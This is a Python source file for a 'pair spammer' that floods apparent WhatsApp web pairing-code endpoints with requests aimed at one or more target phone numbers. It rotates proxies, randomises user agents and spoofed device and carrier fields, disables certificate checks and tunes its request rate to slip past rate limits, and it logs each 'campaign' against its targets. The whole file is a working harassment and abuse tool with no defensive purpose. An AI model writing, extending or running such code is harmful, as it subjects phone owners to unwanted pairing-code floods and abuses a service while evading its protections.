import asyncio
import random
import secrets
import hashlib
import json
import logging
from typing import Dict, Optional, List, Union, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import time
import aiohttp
import ssl
from aiohttp import ClientTimeout, TCPConnector

from phonenumbers import parse, PhoneNumberFormat, format_number
from phonenumbers import geocoder, carrier
import phonenumbers
from colorama import Fore, Style, init
from fake_useragent import UserAgent

try:
    from tqdm.asyncio import tqdm_asyncio
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"spam_pair_{datetime.now().strftime('%Y%m%d')}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

init(autoreset=True)

class StatusCode(Enum):
    SUCCESS = 200
    RATE_LIMITED = 429
    BAD_REQUEST = 400
    UNAUTHORIZED = 401
    FORBIDDEN = 403
    SERVER_ERROR = 500
    SERVICE_UNAVAILABLE = 503

@dataclass
class RequestResult:
    success: bool
    status_code: Optional[int] = None
    pairing_code: Optional[str] = None
    response_data: Optional[Dict] = None
    error_message: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    request_duration: float = 0.0
    proxy_used: Optional[str] = None

@dataclass
class PhoneMetadata:
    country_code: str
    national_number: str
    region: str
    formatted: str
    is_valid: bool
    number_type: str
    carrier_name: Optional[str] = None

class PhoneNumberParser:
    @staticmethod
    def parse(target: str) -> Optional[PhoneMetadata]:
        try:
            cleaned = ''.join(c for c in target if c.isdigit() or c == '+')
            if not cleaned.startswith('+'):
                cleaned = '+' + cleaned
            
            parsed = parse(cleaned, None)
            
            if not phonenumbers.is_valid_number(parsed):
                return None
            
            region = geocoder.description_for_number(parsed, "en") or "Unknown"
            carrier_name = carrier.name_for_number(parsed, "en") or None
            
            return PhoneMetadata(
                country_code=str(parsed.country_code),
                national_number=str(parsed.national_number),
                region=region,
                formatted=format_number(parsed, PhoneNumberFormat.INTERNATIONAL),
                is_valid=True,
                number_type=str(phonenumbers.number_type(parsed)),
                carrier_name=carrier_name
            )
        except Exception as e:
            logger.error(f"Phone parsing error: {e}")
            return None

class ProxyRotator:
    def __init__(self, proxies: Optional[List[str]] = None):
        self.proxies = proxies or []
        self.current_index = 0
        self.failed_proxies = set()
        self.proxy_stats = {}
        
    def add_proxy(self, proxy: str):
        if '://' not in proxy:
            proxy = f'http://{proxy}'
        self.proxies.append(proxy)
        self.proxy_stats[proxy] = {'uses': 0, 'fails': 0, 'last_used': None}
    
    def get_next_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
            
        available = [p for p in self.proxies if p not in self.failed_proxies]
        
        if not available:
            self.failed_proxies.clear()
            available = self.proxies
        
        proxy = available[self.current_index % len(available)]
        self.current_index += 1
        self.proxy_stats[proxy]['uses'] += 1
        self.proxy_stats[proxy]['last_used'] = datetime.now()
        return proxy
    
    def mark_failed(self, proxy: str):
        self.failed_proxies.add(proxy)
        if proxy in self.proxy_stats:
            self.proxy_stats[proxy]['fails'] += 1
    
    def get_stats(self) -> Dict:
        return self.proxy_stats

class AdaptiveRateLimiter:
    def __init__(self, requests_per_minute: float = 30.0):
        self.rate = requests_per_minute / 60.0
        self.tokens = self.rate * 10
        self.max_tokens = self.tokens
        self.last_update = time.monotonic()
        self._lock = asyncio.Lock()
        self.total_requests = 0
        self.blocked_requests = 0
        self.adaptive_factor = 1.0
    
    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self.last_update
            self.tokens = min(self.max_tokens, self.tokens + elapsed * self.rate * self.adaptive_factor)
            self.last_update = now
            
            if self.tokens < 1:
                wait_time = (1 - self.tokens) / (self.rate * self.adaptive_factor)
                self.blocked_requests += 1
                await asyncio.sleep(wait_time)
                self.tokens = 0
            else:
                self.tokens -= 1
            
            self.total_requests += 1
            return True
    
    def adjust_rate(self, success: bool):
        if not success:
            self.adaptive_factor = max(0.5, self.adaptive_factor * 0.9)
        else:
            self.adaptive_factor = min(2.0, self.adaptive_factor * 1.02)
    
    def get_stats(self) -> Dict:
        return {
            'total_requests': self.total_requests,
            'blocked_requests': self.blocked_requests,
            'current_tokens': self.tokens,
            'adaptive_factor': self.adaptive_factor,
            'rate_per_minute': self.rate * 60 * self.adaptive_factor
        }

class PairSpammer:
    PAIRING_ENDPOINTS = [
        "https://web.whatsapp.com/v2/expose/expose_pairing_code",
        "https://web.whatsapp.com/v3/expose/expose_pairing_code",
        "https://web.whatsapp.com/v4/expose/expose_pairing_code",
    ]
    
    WA_VERSIONS = [
        "2.3000.1031980585",
        "2.3000.1031992593",
        "2.3000.1032004601",
        "2.3000.1032016610",
        "2.3000.1032028618",
    ]
    
    def __init__(
        self, 
        proxy_manager: Optional[ProxyRotator] = None,
        rate_limit: float = 30.0,
        max_concurrent: int = 5,
        use_http2: bool = True
    ):
        self.proxy_manager = proxy_manager or ProxyRotator()
        self.rate_limiter = AdaptiveRateLimiter(rate_limit)
        self.max_concurrent = max_concurrent
        self.use_http2 = use_http2
        self.ua = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'rate_limited': 0,
            'start_time': None
        }
        
        self._session: Optional[aiohttp.ClientSession] = None
        self._semaphore = asyncio.Semaphore(max_concurrent)
        self._connector: Optional[TCPConnector] = None
        
    async def __aenter__(self):
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        self._connector = TCPConnector(
            limit=100,
            limit_per_host=30,
            enable_cleanup_closed=True,
            force_close=True,
            ssl=ssl_context,
            use_dns_cache=True,
            ttl_dns_cache=300
        )
        
        timeout = ClientTimeout(total=15, connect=5, sock_read=10)
        
        self._session = aiohttp.ClientSession(
            connector=self._connector,
            timeout=timeout,
            headers={
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            }
        )
        
        self.stats['start_time'] = datetime.now()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._session:
            await self._session.close()
        if self._connector:
            await self._connector.close()
    
    def _generate_device_id(self) -> str:
        return secrets.token_hex(8)
    
    def _generate_ref_id(self) -> str:
        return secrets.token_hex(16)
    
    def _generate_headers(self, phone_meta: PhoneMetadata) -> Dict[str, str]:
        wa_version = random.choice(self.WA_VERSIONS)
        
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en;q=0.8', 'es-ES,es;q=0.9']),
            'Content-Type': 'application/json',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/',
            'DNT': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-WA-Version': wa_version,
            'X-WA-Browser-Version': wa_version,
            'X-WA-Platform': random.choice(['web', 'desktop', 'smba']),
        }
        
        if random.random() > 0.3:
            headers['X-Requested-With'] = 'XMLHttpRequest'
        
        return headers
    
    def _generate_payload(self, phone_meta: PhoneMetadata) -> Dict[str, Any]:
        return {
            "cc": phone_meta.country_code,
            "in": phone_meta.national_number,
            "ref": self._generate_ref_id(),
            "platform": random.choice(["smba", "smbi", "android", "ios", "web"]),
            "app_version": random.choice(self.WA_VERSIONS),
            "device_id": self._generate_device_id(),
            "device_type": random.choice(["web", "desktop", "tablet", "mobile"]),
            "mcc": str(random.randint(100, 999)),
            "mnc": str(random.randint(10, 999)).zfill(3),
            "sim_mcc": str(random.randint(100, 999)),
            "sim_mnc": str(random.randint(10, 999)).zfill(3),
        }
    
    async def _send_single_request(
        self, 
        phone_meta: PhoneMetadata,
        endpoint_idx: int = 0
    ) -> RequestResult:
        async with self._semaphore:
            await self.rate_limiter.acquire()
            
            start_time = time.monotonic()
            proxy = self.proxy_manager.get_next_proxy() if self.proxy_manager.proxies else None
            
            headers = self._generate_headers(phone_meta)
            payload = self._generate_payload(phone_meta)
            endpoint = self.PAIRING_ENDPOINTS[endpoint_idx % len(self.PAIRING_ENDPOINTS)]
            
            try:
                proxy_url = proxy if proxy else None
                
                async with self._session.post(
                    endpoint,
                    json=payload,
                    headers=headers,
                    proxy=proxy_url
                ) as response:
                    
                    duration = time.monotonic() - start_time
                    status = response.status
                    
                    if status == StatusCode.SUCCESS.value:
                        try:
                            data = await response.json()
                            pairing_code = data.get('code') or data.get('pairing_code') or data.get('login')
                            
                            self.rate_limiter.adjust_rate(True)
                            
                            return RequestResult(
                                success=True,
                                status_code=status,
                                pairing_code=pairing_code,
                                response_data=data,
                                request_duration=duration,
                                proxy_used=proxy
                            )
                        except Exception:
                            return RequestResult(
                                success=False,
                                status_code=status,
                                error_message="Invalid JSON",
                                request_duration=duration,
                                proxy_used=proxy
                            )
                    
                    elif status == StatusCode.RATE_LIMITED.value:
                        self.stats['rate_limited'] += 1
                        self.rate_limiter.adjust_rate(False)
                        
                        if proxy:
                            self.proxy_manager.mark_failed(proxy)
                        
                        retry_after = int(response.headers.get('Retry-After', 60))
                        
                        return RequestResult(
                            success=False,
                            status_code=status,
                            error_message=f"Rate limited. Retry after {retry_after}s",
                            request_duration=duration,
                            proxy_used=proxy
                        )
                    
                    elif status >= 500:
                        self.rate_limiter.adjust_rate(False)
                        return RequestResult(
                            success=False,
                            status_code=status,
                            error_message=f"Server error: {status}",
                            request_duration=duration,
                            proxy_used=proxy
                        )
                    
                    else:
                        text = await response.text()
                        self.rate_limiter.adjust_rate(False)
                        return RequestResult(
                            success=False,
                            status_code=status,
                            error_message=f"HTTP {status}: {text[:100]}",
                            request_duration=duration,
                            proxy_used=proxy
                        )
                        
            except asyncio.TimeoutError:
                if proxy:
                    self.proxy_manager.mark_failed(proxy)
                self.rate_limiter.adjust_rate(False)
                return RequestResult(
                    success=False,
                    error_message="Timeout",
                    request_duration=time.monotonic() - start_time,
                    proxy_used=proxy
                )
                
            except aiohttp.ClientError as e:
                if proxy:
                    self.proxy_manager.mark_failed(proxy)
                self.rate_limiter.adjust_rate(False)
                return RequestResult(
                    success=False,
                    error_message=f"Client error: {str(e)}",
                    request_duration=time.monotonic() - start_time,
                    proxy_used=proxy
                )
                
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                return RequestResult(
                    success=False,
                    error_message=f"Unexpected: {str(e)}",
                    request_duration=time.monotonic() - start_time,
                    proxy_used=proxy
                )
    
    async def spam(
        self, 
        target: str, 
        amount: int,
        progress_callback: Optional[callable] = None
    ) -> Dict[str, Any]:
        phone_meta = PhoneNumberParser.parse(target)
        if not phone_meta:
            return {
                'success': False,
                'error': f'Invalid phone number format: {target}',
                'target': target,
                'timestamp': datetime.now().isoformat()
            }
        
        print(Fore.CYAN + f"\n[📱] Target: {phone_meta.formatted} ({phone_meta.region})")
        print(Fore.CYAN + f"[📱] Carrier: {phone_meta.carrier_name or 'Unknown'}")
        print(Fore.CYAN + f"[🎯] Requests: {amount}\n")
        
        amount = max(10, min(amount, 500))
        
        results = {
            'target': target,
            'parsed_number': {
                'country_code': phone_meta.country_code,
                'national_number': phone_meta.national_number,
                'region': phone_meta.region,
                'formatted': phone_meta.formatted,
                'carrier': phone_meta.carrier_name
            },
            'requested': amount,
            'successful': 0,
            'failed': 0,
            'rate_limited': 0,
            'pairing_codes': [],
            'errors': [],
            'request_details': [],
            'start_time': datetime.now().isoformat(),
            'end_time': None,
            'duration_seconds': 0,
            'proxy_stats': {}
        }
        
        tasks = []
        for i in range(amount):
            endpoint_idx = i % len(self.PAIRING_ENDPOINTS)
            
            if i > 0 and i % 10 == 0:
                jitter = random.uniform(0.5, 1.5)
                await asyncio.sleep(jitter)
            
            task = self._send_single_request(phone_meta, endpoint_idx)
            tasks.append(task)
        
        completed = 0
        successful = 0
        failed = 0
        
        if TQDM_AVAILABLE:
            pbar = tqdm_asyncio(total=amount, desc="Sending", unit="req")
        else:
            pbar = None
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            
            if result.success:
                successful += 1
                self.stats['successful'] += 1
                results['pairing_codes'].append(result.pairing_code)
                print(Fore.GREEN + f"[✓] Success: {result.pairing_code or 'OK'} (Proxy: {result.proxy_used or 'Direct'})")
            else:
                failed += 1
                self.stats['failed'] += 1
                if "Rate limited" in (result.error_message or ""):
                    results['rate_limited'] += 1
                
                error_msg = result.error_message or "Unknown error"
                results['errors'].append(error_msg)
                
                if result.status_code == 429:
                    print(Fore.YELLOW + f"[⚠] Rate limited: {error_msg[:50]}")
                else:
                    print(Fore.RED + f"[✗] Failed: {error_msg[:50]}")
            
            results['request_details'].append({
                'success': result.success,
                'status_code': result.status_code,
                'pairing_code': result.pairing_code,
                'error': result.error_message,
                'duration': result.request_duration,
                'proxy': result.proxy_used,
                'timestamp': result.timestamp.isoformat()
            })
            
            if pbar:
                pbar.update(1)
                pbar.set_postfix(success=successful, fail=failed, rate_limit=results['rate_limited'])
            
            if progress_callback:
                progress_callback(completed, amount, successful, failed)
        
        if pbar:
            await pbar.close()
        
        results['successful'] = successful
        results['failed'] = failed
        results['end_time'] = datetime.now().isoformat()
        results['duration_seconds'] = (datetime.fromisoformat(results['end_time']) - 
                                      datetime.fromisoformat(results['start_time'])).total_seconds()
        results['proxy_stats'] = self.proxy_manager.get_stats()
        results['rate_limiter_stats'] = self.rate_limiter.get_stats()
        
        print(Fore.CYAN + f"\n{'='*50}")
        print(Fore.WHITE + f"Campaign Complete: {phone_meta.formatted}")
        print(Fore.GREEN + f"✓ Successful: {successful}/{amount}")
        print(Fore.RED + f"✗ Failed: {failed}/{amount}")
        print(Fore.YELLOW + f"⚠ Rate Limited: {results['rate_limited']}")
        print(Fore.CYAN + f"⏱ Duration: {results['duration_seconds']:.2f}s")
        print(Fore.CYAN + f"{'='*50}\n")
        
        return results

class MultiTargetSpammer:
    def __init__(self, proxy_file: Optional[str] = None, rate_limit: float = 30.0):
        self.proxy_rotator = ProxyRotator()
        self._proxy_file = proxy_file
        self.rate_limit = rate_limit
        self.results = {}
    
    async def load_proxies(self):
        if not self._proxy_file:
            return
            
        try:
            with open(self._proxy_file, 'r') as f:
                for line in f:
                    if line.strip():
                        self.proxy_rotator.add_proxy(line.strip())
            logger.info(f"Loaded {len(self.proxy_rotator.proxies)} proxies")
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
    
    async def spam_multiple(
        self, 
        targets: List[str], 
        amount_per_target: int,
        concurrent_targets: int = 3
    ) -> Dict[str, Any]:
        await self.load_proxies()
        
        semaphore = asyncio.Semaphore(concurrent_targets)
        results = {}
        
        async def spam_one(target: str):
            async with semaphore:
                async with PairSpammer(
                    proxy_manager=self.proxy_rotator,
                    rate_limit=self.rate_limit,
                    max_concurrent=5
                ) as spammer:
                    return await spammer.spam(target, amount_per_target)
        
        tasks = [spam_one(target) for target in targets]
        
        for target, task in zip(targets, asyncio.as_completed(tasks)):
            try:
                result = await task
                results[target] = result
            except Exception as e:
                results[target] = {'error': str(e)}
        
        return {
            'campaign_id': secrets.token_hex(8),
            'targets': results,
            'summary': {
                'total_targets': len(targets),
                'total_successful': sum(r.get('successful', 0) for r in results.values() if isinstance(r, dict)),
                'total_failed': sum(r.get('failed', 0) for r in results.values() if isinstance(r, dict)),
            },
            'timestamp': datetime.now().isoformat()
        }

async def spam_pair(
    target: str, 
    amount: int = 50, 
    proxies: Optional[List[str]] = None,
    rate_limit: float = 30.0,
    use_http2: bool = True
) -> Dict[str, Any]:
    proxy_rotator = ProxyRotator()
    if proxies:
        for proxy in proxies:
            proxy_rotator.add_proxy(proxy)
    
    async with PairSpammer(
        proxy_manager=proxy_rotator,
        rate_limit=rate_limit,
        max_concurrent=5,
        use_http2=use_http2
    ) as spammer:
        return await spammer.spam(target, amount)

async def spam_multiple_targets(
    targets: List[str],
    amount_per_target: int = 50,
    proxy_file: Optional[str] = None,
    concurrent_targets: int = 3
) -> Dict[str, Any]:
    multi = MultiTargetSpammer(proxy_file=proxy_file, rate_limit=30.0)
    return await multi.spam_multiple(targets, amount_per_target, concurrent_targets)